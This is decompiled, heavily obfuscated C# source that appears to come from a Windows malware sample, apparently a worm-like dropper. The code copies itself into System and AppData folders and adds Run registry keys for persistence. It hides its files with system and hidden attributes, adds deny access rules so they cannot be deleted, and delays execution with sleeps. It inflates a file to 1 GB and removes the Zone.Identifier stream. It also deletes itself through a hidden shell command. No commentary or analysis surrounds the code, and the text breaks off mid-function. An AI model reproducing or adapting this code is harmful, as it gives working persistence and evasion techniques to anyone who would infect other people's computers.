using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class _____________________________________________________________________________
{
	private static FileStream m__;

	public static string __;

	public static bool ___ = false;

	private static bool m_____ = false;

	public static void _()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 89:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_001f;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_001f:
					num = 4;
					if (!_____________________________________________________________________________.m_____)
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0007:
					num = 2;
					________________(______________________.__);
					goto IL_0013;
					IL_0013:
					num = 3;
					_________________(_____________________________________________________________________________.__);
					goto IL_001f;
					end_IL_0000_2:
					break;
				}
				num = 5;
				____();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 89;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void __(string string_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string_0, writable: true);
			if (registryKey == null)
			{
				Registry.CurrentUser.CreateSubKey(string_0);
			}
			registryKey.SetValue(______________________________________________________________._________________, _003CModule_003E.______<string>(2703211100u) + _____________________________________________________________________________.__ + _003CModule_003E._____<string>(349267069u));
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ___()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num6 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		string[] array = default(string[]);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num5;
				nint num9;
				int num11;
				int num12;
				int num13;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 1479:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 4:
						case 5:
							goto IL_0030;
						case 6:
							goto IL_003d;
						case 7:
							goto IL_0168;
						case 8:
						case 9:
							goto IL_0170;
						case 10:
							goto IL_0186;
						case 11:
							goto IL_0191;
						case 13:
							goto IL_01aa;
						case 14:
							goto IL_01ae;
						case 25:
							goto IL_01df;
						case 26:
							goto IL_01ed;
						case 15:
							goto IL_0238;
						case 17:
							goto IL_0300;
						case 18:
							goto IL_031f;
						case 19:
							goto IL_032c;
						case 20:
							goto IL_03c5;
						case 21:
							goto IL_03d3;
						case 24:
							goto IL_03f1;
						case 16:
							goto IL_0425;
						case 12:
						case 22:
						case 23:
							goto IL_04c5;
						case 27:
							goto IL_04dd;
						case 28:
							goto IL_04eb;
						case 29:
							goto IL_04f9;
						case 30:
							goto IL_0507;
						case 31:
							goto IL_0515;
						case 32:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
						case 33:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_04eb:
					num = 28;
					_______(______________________.___);
					goto IL_04f9;
					IL_0008:
					num = 2;
					if (Operators.CompareString(______________________________________________________________._________________, _003CModule_003E._______<string>(1177340789u), false) != 0)
					{
						goto IL_0030;
					}
					num5 = (nint)Type.EmptyTypes.LongLength + 3;
					goto IL_048e;
					IL_04f9:
					num = 29;
					_______(______________________._____);
					goto IL_0507;
					IL_0030:
					num = 5;
					Thread.Sleep(15000);
					goto IL_003d;
					IL_003d:
					num = 6;
					num6 = 22363;
					num7 = global::___________._;
					if (-28389376 + (num7 << 12) == num7 * -9375744)
					{
						num9 = ((num8 * 7 + 25 * num8 - 8868864 != (num8 | -3047) * 32) ? ((nint)Type.EmptyTypes.LongLength + -1390417526) : (sizeof(Guid) + -1869600232));
					}
					else if (8686 + num3 - 6555 == (int)((uint)(0x1921 ^ (num3 + num3)) >> 1))
					{
						if (-2500 + num8 - 2235 == -num8)
						{
							num9 = 2031576997;
						}
						else
						{
							int num10 = ______________________._______;
							num9 = (((1 & (((int)(0xF1DE1D3Fu | ((uint)num10 >> 5)) + num10) ^ num10)) == 1) ? (sizeof(double) + -1397890079) : ((nint)Type.EmptyTypes.LongLength + 1021211034));
						}
					}
					else
					{
						num9 = (nint)Type.EmptyTypes.LongLength + 17639;
					}
					if (num9 == 2745)
					{
						goto IL_01df;
					}
					if (!((ServerComputer)global::_____________._).get_Info().get_OSFullName().Contains(_003CModule_003E.____<string>(4143521188u)))
					{
						goto IL_0170;
					}
					num11 = ______________________._______;
					if ((0xFFFFF8DEu ^ ((uint)num11 % 80320u)) != 0 && num6 == 22363)
					{
						goto IL_0168;
					}
					goto IL_04c5;
					IL_0515:
					num = 31;
					_______(_____________________________________________________________________________.__);
					break;
					IL_0425:
					num6 = 4804;
					if (num7 + -599523328 != (-9773 & num7))
					{
						goto IL_02d6;
					}
					goto IL_031f;
					IL_02bb:
					Interaction.Shell(string.Concat(array), (AppWinStyle)0, false, -1);
					if (num6 != -26730)
					{
						goto IL_02d6;
					}
					goto IL_03c5;
					IL_02d6:
					num = 16;
					text = Strings.Replace(text, _003CModule_003E.______<string>(4262558110u), Environment.UserName, 1, -1, (CompareMethod)0);
					if (num6 != 14663)
					{
						goto IL_0300;
					}
					goto IL_0396;
					IL_0300:
					num = 17;
					text = Strings.Replace(text, _003CModule_003E._______<string>(1953511905u), _____________________________________________________________________________.__, 1, -1, (CompareMethod)0);
					goto IL_031f;
					IL_031f:
					num = 18;
					File.WriteAllText(text2, text);
					goto IL_032c;
					IL_0295:
					array[5] = text2;
					array[6] = _003CModule_003E.______<string>(3901353657u);
					num8 = num6;
					num6 = -26730;
					if (num8 == -15514)
					{
					}
					goto IL_02bb;
					IL_0463:
					array[6] = _003CModule_003E.______<string>(620915135u);
					Interaction.Shell(string.Concat(array), (AppWinStyle)0, false, -1);
					if (num6 != -31660)
					{
						goto IL_02bb;
					}
					goto IL_04c5;
					IL_032c:
					num = 19;
					num6 = 11762;
					array = new string[7]
					{
						_003CModule_003E.____<string>(2700354150u),
						null,
						null,
						null,
						null,
						null,
						null
					};
					num8 = 11762;
					num6 = 6380;
					array[1] = text3;
					array[2] = ______________________________________________________________._________________;
					array[3] = text3;
					array[4] = _003CModule_003E.____<string>(1630416607u);
					num12 = -15514;
					num6 = num12;
					num5 = (nint)Type.EmptyTypes.LongLength + 10;
					goto IL_048e;
					IL_0396:
					array[4] = _003CModule_003E.______<string>(1635443909u);
					array[5] = _____________________________________________________________________________.__;
					num6 = -31660;
					num5 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_048e;
					IL_0507:
					num = 30;
					_______(______________________.____);
					goto IL_0515;
					IL_03c5:
					num = 20;
					Thread.Sleep(5000);
					goto IL_03d3;
					IL_03d3:
					num = 21;
					_____________________________________________________________________________.m__ = new FileStream(text2, FileMode.Open, FileAccess.Read, FileShare.None);
					num6 = -1583;
					goto IL_04c5;
					IL_04c5:
					num = 23;
					Thread.Sleep(600000);
					goto IL_03f1;
					IL_0168:
					num = 7;
					____();
					goto IL_0170;
					IL_0170:
					num = 9;
					text3 = _003CModule_003E.___<string>(4017844528u);
					num6 = 29337;
					goto IL_0186;
					IL_0186:
					num = 10;
					if (___________________________________________________________________.________())
					{
						goto IL_0191;
					}
					goto IL_01aa;
					IL_0191:
					num = 11;
					array = new string[7];
					num5 = (nint)Type.EmptyTypes.LongLength + 1;
					goto IL_048e;
					IL_01aa:
					num = 13;
					goto IL_01ae;
					IL_01ae:
					num = 14;
					text2 = Environment.GetEnvironmentVariable(_003CModule_003E._______<string>(2531281878u)) + _003CModule_003E.______<string>(1274239456u);
					num5 = sizeof(float) + 7;
					goto IL_048e;
					IL_01df:
					num = 25;
					_______________(_____________________________________________________________________________.__);
					goto IL_01ed;
					IL_01ed:
					num = 26;
					_______(______________________.__);
					num13 = global::___________._;
					num5 = (((0xE2E ^ (((uint)num13 >> 18) / 1645776796u) ^ 0x20001C03) == 0) ? ((nint)Type.EmptyTypes.LongLength + -1852609654) : ((nint)Type.EmptyTypes.LongLength + 5));
					goto IL_048e;
					IL_03f1:
					num = 24;
					_______________(______________________.__);
					num5 = (nint)Type.EmptyTypes.LongLength + 8;
					goto IL_048e;
					IL_0238:
					num = 15;
					text = ___________________________________________________________________._(__________________________________________________________________________._______, _003CModule_003E._______<string>(2955449767u));
					num6 = (int)(((0x165E & (5307 + num8 * 76341248)) == 5146) ? (sizeof(byte) + 4803) : ((nint)Type.EmptyTypes.LongLength + 1048829397));
					num5 = sizeof(byte) + 3;
					goto IL_048e;
					IL_048e:
					while (true)
					{
						switch (num5)
						{
						case 8:
							break;
						case 11:
							goto IL_0238;
						case 10:
							goto IL_0295;
						case 2:
							goto IL_031f;
						case 6:
							goto IL_0396;
						case 7:
							array[2] = ______________________________________________________________._________________;
							array[3] = text3;
							num5 = (nint)Type.EmptyTypes.LongLength + 6;
							continue;
						case 4:
							goto IL_0425;
						case 1:
							array[0] = _003CModule_003E._____<string>(1644963430u);
							array[1] = text3;
							num5 = (nint)Type.EmptyTypes.LongLength + 7;
							continue;
						case 0:
							goto IL_0463;
						case 5:
							goto IL_04dd;
						case 9:
							goto IL_04f9;
						default:
							goto end_IL_0000_3;
						}
						break;
					}
					goto IL_01df;
					IL_04dd:
					num = 27;
					_______(______________________._);
					goto IL_04eb;
					end_IL_0000_2:
					break;
				}
				num = 32;
				____();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1479;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ____()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		RegistryKey registryKey = default(RegistryKey);
		int num7 = default(int);
		RegistryKey registryKey2 = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num6;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0009;
				case 911:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 8:
							goto IL_004f;
						case 6:
							goto IL_0086;
						case 12:
							goto IL_00c7;
						case 11:
							goto IL_00d5;
						case 3:
							goto IL_010f;
						case 4:
							goto IL_0149;
						case 5:
							goto IL_0211;
						case 9:
							goto IL_024a;
						case 10:
							goto IL_0292;
						case 7:
						case 13:
						case 14:
							goto IL_02ef;
						case 15:
							goto IL_02ff;
						case 16:
							goto IL_030d;
						case 17:
						case 18:
							goto IL_0316;
						case 19:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 20:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_010f:
					num5 = 4444;
					goto IL_0116;
					IL_0009:
					num = 2;
					if (!___________________________________________________________________.________())
					{
						goto IL_004f;
					}
					num5 = (int)((((262144 * num3 - -1684018084) ^ 0x2057) == 0) ? ((nint)Type.EmptyTypes.LongLength + -2035438485) : ((nint)Type.EmptyTypes.LongLength + 4444));
					num6 = (nint)Type.EmptyTypes.LongLength + 3;
					goto IL_0060;
					IL_0116:
					num = 3;
					text = Environment.GetFolderPath(Environment.SpecialFolder.System) + _003CModule_003E.______<string>(2594705015u);
					if (num5 == -9045 && num2 - 66528 != num2)
					{
						goto default;
					}
					goto IL_0149;
					IL_0149:
					num = 4;
					registryKey = Registry.LocalMachine.OpenSubKey(_003CModule_003E.____<string>(2556201429u), writable: true);
					if ((num3 & 0x45B04070) + 2337 - -1224736768 != num3)
					{
						num6 = (((((uint)num3 & ((uint)num3 / 26u)) ^ 0x1000007C) == 0) ? ((nint)Type.EmptyTypes.LongLength + -2068356414) : ((nint)Type.EmptyTypes.LongLength + 1));
					}
					else if ((((num5 << 11) - 6079) ^ 0x1122) == 0)
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 1596571622;
					}
					else
					{
						num7 = _003CModule_003E.______________;
						num6 = ((((14 * num7 + num7 * 50) & (num7 * 1155399680)) == 5309) ? ((nint)Type.EmptyTypes.LongLength + 450697940) : (sizeof(ulong) + 1638871711));
					}
					goto IL_0060;
					IL_0086:
					num = 6;
					registryKey.Close();
					goto IL_02ef;
					IL_00c7:
					num = 12;
					registryKey2.Close();
					goto IL_02ef;
					IL_004f:
					num = 8;
					num5 = 9176;
					num6 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_0060;
					IL_0060:
					switch (num6)
					{
					case 6:
						break;
					case 5:
						goto IL_00c7;
					case 4:
						goto IL_00d5;
					case 3:
						goto IL_010f;
					default:
						goto IL_0116;
					case 1:
						goto IL_0211;
					case 0:
						goto IL_024a;
					case 2:
						goto IL_02ff;
					}
					goto IL_0086;
					IL_02ff:
					num = 15;
					File.Copy(_____________________________________________________________________________.__, text);
					goto IL_030d;
					IL_030d:
					num = 16;
					__________(text);
					goto IL_0316;
					IL_024a:
					num5 = 9176;
					if ((((uint)(num2 - 728) >> 2) & 1) != (((uint)num2 / 4u) & 1))
					{
						goto default;
					}
					num = 9;
					text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.___<string>(3375608993u);
					if (num5 != 9176)
					{
						goto IL_0116;
					}
					goto IL_0292;
					IL_0316:
					num = 18;
					_________________(text);
					break;
					IL_0292:
					num = 10;
					registryKey2 = Registry.CurrentUser.OpenSubKey(_003CModule_003E.___<string>(734532677u), writable: true);
					if ((0x203D ^ (num7 * 13478 - 1832)) == 0)
					{
						if ((94 * num5 + 34 * num5) * 33554432 != -9447)
						{
						}
						goto IL_0116;
					}
					num6 = sizeof(float) + 0;
					goto IL_0060;
					IL_00d5:
					num = 11;
					registryKey2.SetValue(_003CModule_003E.______<string>(1538725490u), _003CModule_003E.____<string>(1197958444u) + text + _003CModule_003E.____<string>(1952435953u));
					num6 = (nint)Type.EmptyTypes.LongLength + 5;
					goto IL_0060;
					IL_02ef:
					num = 14;
					if (!File.Exists(text))
					{
						int num8 = _003CModule_003E.___________;
						num6 = (((4 & (-8891 + (num8 << 2))) != (4 & (~num8 * 4))) ? ((nint)Type.EmptyTypes.LongLength + 1348734321) : ((nint)Type.EmptyTypes.LongLength + 2));
						goto IL_0060;
					}
					goto IL_0316;
					IL_0211:
					num = 5;
					registryKey.SetValue(_003CModule_003E.____<string>(3944878662u), _003CModule_003E.____<string>(4104248507u) + text + _003CModule_003E.______<string>(2703211100u));
					num6 = (nint)Type.EmptyTypes.LongLength + 6;
					goto IL_0060;
					end_IL_0000_2:
					break;
				}
				num = 19;
				_____________________________________________________________________________.m_____ = true;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 911;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _____()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string string_ = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string folderPath;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 173:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_0029;
						case 5:
							goto IL_0043;
						case 6:
						case 7:
							goto IL_004c;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_004c:
					num = 7;
					folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					__________________________________.____________ = null;
					string_ = folderPath + _003CModule_003E.____<string>(256956498u);
					break;
					IL_0007:
					num = 2;
					_____________________________________________________________________________.m_____ = false;
					switch ((nint)Type.EmptyTypes.LongLength + 0)
					{
					}
					goto IL_0020;
					IL_0020:
					num = 3;
					if (___________________________________________________________________.________())
					{
						goto IL_0029;
					}
					goto IL_004c;
					IL_0029:
					num = 4;
					string_ = Environment.GetFolderPath(Environment.SpecialFolder.System) + _003CModule_003E._______<string>(3287423332u);
					goto IL_0043;
					IL_0043:
					num = 5;
					______(string_);
					goto IL_004c;
					end_IL_0000_2:
					break;
				}
				num = 8;
				______(string_);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 173;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ______(string string_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					_003CModule_003E.__________ = 2081625616;
					num3 = 1;
					goto IL_0011;
				case 95:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0011;
						case 3:
							goto IL_001b;
						case 4:
							goto IL_0023;
						case 5:
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						}
						goto default;
					}
					IL_0023:
					num = 4;
					File.Delete(string_0);
					break;
					IL_0011:
					num = 2;
					if (!File.Exists(string_0))
					{
						break;
					}
					goto IL_001b;
					IL_001b:
					num = 3;
					_______________(string_0);
					goto IL_0023;
					end_IL_0000_2:
					break;
				}
				_003CModule_003E.__________ = 1308380089;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 95;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _______(string string_0)
	{
		try
		{
			if (Directory.Exists(string_0))
			{
				FileInfo fileInfo = new FileInfo(string_0);
				fileInfo.Attributes = FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public unsafe static void ________()
	{
		try
		{
			nint num;
			if (Operators.CompareString(______________________________________________________________.________________, _003CModule_003E._____<string>(3717744333u), false) == 0)
			{
				num = (nint)Type.EmptyTypes.LongLength + 2;
				goto IL_00d2;
			}
			_____________________________________________________________________________.__ = Application.get_ExecutablePath();
			string text = ______________________.__ + ______________________________________________________________.________________;
			int num2 = -32577;
			int num3 = global::___________._;
			if (4194304 * (num3 << 15) - int.MinValue == (int)((uint)num3 % 65u << 5))
			{
				goto IL_015d;
			}
			if (Application.get_ExecutablePath().Contains(______________________________________________________________.________________))
			{
				return;
			}
			if (Application.get_ExecutablePath().Contains(_003CModule_003E._______<string>(764547847u)))
			{
				if (num2 != -32577)
				{
				}
				Thread.Sleep(60000);
				if (______________________________________________________________.____(______________________________________________________________.__________________))
				{
					ProjectData.EndApp();
				}
				if (File.Exists(text))
				{
					goto IL_00e9;
				}
				goto IL_00f1;
			}
			goto IL_0133;
			IL_00f1:
			Thread.Sleep(60000);
			if (______________________________________________________________.____(______________________________________________________________.__________________))
			{
				goto IL_012e;
			}
			goto IL_0133;
			IL_0133:
			_______________(______________________.__);
			if (!((ServerComputer)global::_____________._).get_FileSystem().FileExists(text))
			{
				num2 = 17582;
				num = sizeof(byte) + 2;
				goto IL_00d2;
			}
			Thread.Sleep(5000);
			_______________(______________________.__);
			_______________(text);
			File.Move(text, Path.GetTempPath() + global::_________________.____________(8, _003CModule_003E.______<string>(4059168937u)));
			______________________.__();
			________();
			return;
			IL_012e:
			ProjectData.EndApp();
			goto IL_0133;
			IL_00d2:
			switch (num)
			{
			default:
				return;
			case 1:
				break;
			case 3:
				goto IL_0109;
			case 0:
				goto IL_012e;
			case 2:
				return;
			}
			goto IL_00e9;
			IL_0109:
			((ServerComputer)global::_____________._).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text);
			__________(text);
			if (num2 != 17582)
			{
				goto IL_012e;
			}
			goto IL_015d;
			IL_015d:
			Thread.Sleep(9000);
			if (File.Exists(text))
			{
				_____________________________________________________________________________.__ = text;
				string text2 = ______________________________________________________________.___________________;
				string value = _003CModule_003E._______<string>(4273329196u);
				______________________._______ = -1978466511;
				if (text2.Contains(value))
				{
					Thread thread = new Thread(_________);
					thread.Start();
				}
				try
				{
					DeleteFile(text + _003CModule_003E.______<string>(1524908573u));
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return;
				}
			}
			return;
			IL_00e9:
			Process.Start(text);
			goto IL_00f1;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void _________()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Random random = default(Random);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 206:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_004a;
						case 4:
							goto IL_0052;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0052:
					num = 4;
					if (!File.Exists(_____________________________________________________________________________.__))
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0008:
					num = 2;
					Thread.Sleep(60000);
					switch (((-536870913 | ((int)((uint)num5 / 8u) + (num5 << 30))) == -536870913) ? ((nint)Type.EmptyTypes.LongLength + 0) : (sizeof(short) + -565184601))
					{
					}
					goto IL_004a;
					IL_004a:
					num = 3;
					random = new Random();
					goto IL_0052;
					end_IL_0000_2:
					break;
				}
				num = 5;
				FileSystemProxy fileSystem = ((ServerComputer)global::_____________._).get_FileSystem();
				string executablePath = Application.get_ExecutablePath();
				string tempPath = Path.GetTempPath();
				Random random2 = random;
				_003CModule_003E._____________ = num3;
				num5 = random2.Next(1000, 9000);
				fileSystem.MoveFile(executablePath, tempPath + num5);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 206;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void __________(string string_0)
	{
		try
		{
			string text = Application.get_ExecutablePath() + _003CModule_003E._____<string>(3894880379u);
			if (File.Exists(text))
			{
				((ServerComputer)global::_____________._).get_FileSystem().CopyFile(text, string_0 + _003CModule_003E.____<string>(3512420499u));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			if (-1757 != (nint)Type.EmptyTypes.LongLength + -1758)
			{
			}
			if (!___________________________________________________________________.______())
			{
				int num = 1073741824;
				FileStream fileStream = File.OpenWrite(string_0);
				for (long num2 = fileStream.Seek(0L, SeekOrigin.End); num2 < num; num2++)
				{
					fileStream.WriteByte(0);
				}
				fileStream.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void ____________()
	{
		_____();
		try
		{
			_________________________________________________________________.__();
			_______________(_____________________________________________________________________________.__);
			_______________(______________________.__);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Random random = new Random();
			string text = Path.GetTempPath() + random.Next(1000, 9000) + _003CModule_003E.___<string>(2972930731u);
			File.Move(_____________________________________________________________________________.__, text);
			_________________________________________________.___________(Application.get_ExecutablePath());
			_________________________________________________.___________(_____________________________________________________________________________.__);
			_____________(5000, text);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			_________________________________________________.___________(_____________________________________________________________________________.__);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
		Environment.Exit(0);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void _____________(int int_0, string string_0)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(_003CModule_003E.______<string>(168821456u));
			processStartInfo.Arguments = _003CModule_003E.____<string>(1516698134u) + int_0 + _003CModule_003E._____<string>(406488863u) + string_0 + _003CModule_003E._____<string>(1419880545u);
			processStartInfo.CreateNoWindow = true;
			processStartInfo.ErrorDialog = false;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			Process.GetCurrentProcess().Kill();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFile(string string_0);

	public static void _______________(string string_0)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(isProtected: false, preserveInheritance: true);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ________________(string string_0)
	{
		try
		{
			if (4345 != (nint)Type.EmptyTypes.LongLength + 4345)
			{
				goto IL_009e;
			}
			string identity = _003CModule_003E.______<string>(857767335u);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			int num = -3260;
			DirectorySecurity directorySecurity = default(DirectorySecurity);
			if ((nint)Type.EmptyTypes.LongLength + 13302 != -12083)
			{
				_003CModule_003E.______________ = -1437277352;
				directorySecurity = new DirectorySecurity();
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ReadAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				goto IL_00dd;
			}
			goto IL_01b2;
			IL_0194:
			nint num2;
			while (true)
			{
				switch (num2)
				{
				case 4:
					break;
				case 2:
					directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.DeleteSubdirectoriesAndFiles, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
					num2 = (nint)Type.EmptyTypes.LongLength + 3;
					continue;
				default:
					goto IL_00dd;
				case 0:
					goto IL_01b2;
				case 3:
					goto IL_01e3;
				}
				break;
			}
			goto IL_009e;
			IL_009e:
			directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			num2 = (nint)Type.EmptyTypes.LongLength + 2;
			goto IL_0194;
			IL_01b2:
